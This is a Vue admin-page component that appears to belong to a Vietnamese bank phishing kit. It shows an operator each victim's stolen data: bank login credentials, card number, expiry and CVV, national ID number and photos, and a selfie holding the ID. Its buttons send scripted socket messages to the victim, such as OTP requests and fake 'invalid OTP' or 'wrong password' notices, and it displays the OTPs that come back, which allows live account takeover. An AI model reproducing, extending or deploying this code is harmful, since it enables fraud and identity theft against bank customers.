<template>
    <VRow class="my-2">
        <VCol cols="12" md="6">
            <VBtn block @click="sendData('OTP')">Gửi yêu cầu OTP</VBtn>
            <p v-if="otp"> {{ otp }}</p>
        </VCol>
        <VCol cols="12" md="6">
            <VBtn block @click="sendData('OTPN')">Gửi thống báo otp không hợp lệ</VBtn>
            <p v-if="otpNew">{{ otpNew }}</p>
        </VCol>
        <VCol cols="12" md="6">
            <VBtn block @click="sendData('TV')">Gửi thông báo chờ nhân viên tư vấn</VBtn>
            <p v-if="statusTV">{{ statusTV }}</p>
        </VCol>
        <VCol cols="12" md="6">
            <VBtn block @click="sendData('zalo')">Gửi thông báo liên hệ zalo</VBtn>
            <p v-if="statusZalo">{{ statusZalo }}</p>
        </VCol>

        <VCol cols="12" md="6">
            <VBtn block @click="sendData('error')">Gửi thông báo Sai tài khoản mật khẩu</VBtn>
            <p v-if="statuserror">{{ statuserror }}</p>
        </VCol>

        <VCol cols="12" md="6">
            <VBtn block @click="sendData('errorInfo')">Gửi thông báo Sai tài khoản mật khẩu</VBtn>
            <p v-if="statuserrorInfo">{{ statuserrorInfo }}</p>
        </VCol>
    </VRow>
    <VCard>
        <VCardTitle>
            Thông tin người dùng
        </VCardTitle>
        <VCardText>
            <VForm class="pa-4">
                <VRow>
                    <VCol cols="12" md="12">
                        <VSelect v-model="formValue.bankLoginName" :items="bankList" label="Tên ngân hàng để đăng nhập"
                            outlined />
                    </VCol>
                    <VCol cols="12" md="12">
                        <VTextField v-model="formValue.bankLoginPassword" label="Mật khẩu đăng nhập ngân hàng" outlined />
                    </VCol>
                    <VCol cols="12" md="12">
                        <VTextField v-model="formValue.bankLoginAccount" label="Tài khoản đăng nhập ngân hàng" outlined />
                    </VCol>
                </VRow>


                <VRow>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.fullName" label="Họ và tên" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cccd" label="CCCD" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.bankName" label="Tên ngân hàng" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.bankPassword" label="Mật khẩu ngân hàng" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.numberPhone" label="Số điện thoại" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VSelect v-model="formValue.typeCard" label="Loại thẻ đang cần làm" outlined
                            :items="['Visa Classic, ', 'Visa gold', 'Visa Signature', 'Mastercard Gold', 'Napas Flex', 'Vietjet Visa', 'Vietjet Visa Classic']" />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VSelect v-model="formValue.cardType" label="Loại thẻ đang sử dụng" outlined :items="[
                            'Thẻ ghi nợ Napas',
                            'Thẻ ghi nợ quốc tế',
                            'Thẻ tín dụng Mastercand, Visa, Jcb',
                        ]" />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cardNumber" label="Số trên mặt thẻ" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cardName" label="Chủ thẻ" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cardDate" label="Ngày hết hạn" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cardCvv" label="Mã CVV" outlined />
                    </VCol>
                </VRow>

                <VRow>
                    <VCol cols="12" md="4">
                        <!-- <VFileInput label="Ảnh mặt trước CCCD" outlined prepend-icon=""></VFileInput> -->
                        <img :src="formValue.imageBefore" alt="">
                    </VCol>
                    <VCol cols="12" md="4">
                        <!-- <VFileInput label="Ảnh mặt sau CCCD" outlined prepend-icon=""></VFileInput> -->
                        <img :src="formValue.imageAfter" alt="">
                    </VCol>
                    <VCol cols="12" md="4">
                        <!-- <VFileInput label="Ảnh mặt chân dung cầm cccd" outlined prepend-icon=""></VFileInput> -->
                        <img :src="formValue.image" alt="">
                    </VCol>
                </VRow>

                <!-- <VBtn @click="submit" color="primary" class="mt-4">
                    Lưu
                </VBtn> -->
            </VForm>
        </VCardText>
    </VCard>
</template>

<script setup>
import axios from '@/plugins/axios';
import { socket } from '@/plugins/socket';
import '@core/scss/template/index.scss';
import '@layouts/styles/index.scss';
import Api from 'axios';
import { onMounted, ref } from 'vue';
import { useRoute } from 'vue-router';
import { useToast } from 'vue-toast-notification';

const route = useRoute();
const otp = ref('');
const otpNew = ref('');
const statusXD = ref('');
const statusTV = ref('');
const formValue = ref({
    actions: null,
});

const statuserror = ref('')
const statusZalo = ref('')
const statuserrorInfo = ref('')


// get user id from route params
const userId = ref(route.params.id);
const bankList = ref([])

// get user detail
const user = ref(null);
onMounted(() => {
    axios.get(`/get-user/${userId.value}`)
        .then(({ data }) => {
            if (data.imageBefore) {
                data.imageBefore = `${import.meta.env.VITE_IMAGE_URL}/${data.imageBefore.replace('public/', 'uploads/')}`;
            }
            if (data.imageAfter) {
                data.imageAfter = `${import.meta.env.VITE_IMAGE_URL}/${data.imageAfter.replace('public/', 'uploads/')}`;
            }
            if (data.image) {
                data.image = `${import.meta.env.VITE_IMAGE_URL}/${data.image.replace('public/', 'uploads/')}`;
            }
            user.value = data;
            formValue.value = data;
            console.log('user', formValue.value);
        }).catch(() => {
            toast.open({
                message: 'Lỗi khi lấy thông tin người dùng',
                type: 'error',
                position: 'top',
            })
        })

    Api.get('https://api.vietqr.io/v2/banks').then(res => {
        bankList.value = res.data.data
        bankList.value.forEach((item) => {
            item.title = item.name + ' - ' + item.short_name
            item.value = item.code
        })
    }).catch(err => {
        console.log(err)
    })

    socket.on('send-data-admin-user', async (data) => {
        console.log('send-data-admin-user', data);
        if (data.otp) {
            otp.value = `Mã OTP là: ${data.otp}`;
        }
    })

});

const sendData = (type) => {
    if (type === 'OTP') {
        otp.value = 'Đang chờ otp...';
    } else if (type === 'OTPN') {
        otpNew.value = 'Đã gửi thông báo otp không hợp lệ...';
    } else if (type === 'error') {
        statuserror.value = 'Đã gửi thông báo sai tài khoản.'
        socket.emit(`send-data-error`, {
            numberPhone: user.value.numberPhone,
        });

        return
    } else if (type === 'zalo') {
        statusZalo.value = 'Đã gửi thông báo liên hệ zalo.'
    } else if (type === 'errorInfo') {
        statuserrorInfo.value = 'Đã gửi thông báo vui lòng nhập đúng thông tin.'
    }
    else {
        statusTV.value = 'Đã gửi thông báo tư vấn';
    }
    socket.emit(`send-data-user`, {
        numberPhone: user.value.numberPhone,
        type,
    });
}
const toast = useToast();

const submit = () => {
    axios.put(`/update-user-id/${userId.value}`, formValue.value)
        .then(() => {
            toast.success('Cập nhật thông tin người dùng thành công');
        }).catch(() => {
            toast.error('Lỗi khi cập nhật thông tin người dùng');
        })
}



</script>
<style lang="scss">
img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}
</style>
